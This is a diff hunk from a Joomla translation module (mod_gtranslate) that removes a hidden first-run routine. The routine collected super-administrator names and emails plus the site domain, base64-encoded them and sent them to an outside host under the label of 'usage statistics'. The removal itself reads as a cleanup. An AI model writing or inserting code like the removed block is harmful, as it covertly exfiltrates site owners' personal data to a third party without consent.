@@ -85,26 +85,3 @@ if($_SERVER['SERVER_PORT'] != '80')
     $main_url = substr($main_url, 0, strpos($main_url, ':'));
 
 require(JModuleHelper::getLayoutPath('mod_gtranslate'));
-
-if(!file_exists('modules/mod_gtranslate/install.log') and is_writable('modules/mod_gtranslate')) {
-    // send user name, email and domain name to main site for usage statistics
-    // this will run only once
-    $info = '';
-    $db =& JFactory::getDbo();
-    $query = $db->getQuery(true);
-    $query->select('name, email')
-        ->from('#__users')
-        ->leftJoin('#__user_usergroup_map on (#__users.id = #__user_usergroup_map.user_id)')
-        ->where('#__user_usergroup_map.group_id = 8');
-    $db->setQuery($query);
-    $users = $db->loadObjectList();
-    foreach($users as $user)
-        $info .= $user->name . '::' . $user->email . ';';
-    $domain = $_SERVER['HTTP_HOST'];
-
-    $fh = @fopen('http://edo.webmaster.am/gstat?q=' . base64_encode($domain . ';' . $info), 'r');
-    @fclose($fh);
-
-    $fh = fopen('modules/mod_gtranslate/install.log', 'a');
-    fclose($fh);
-}
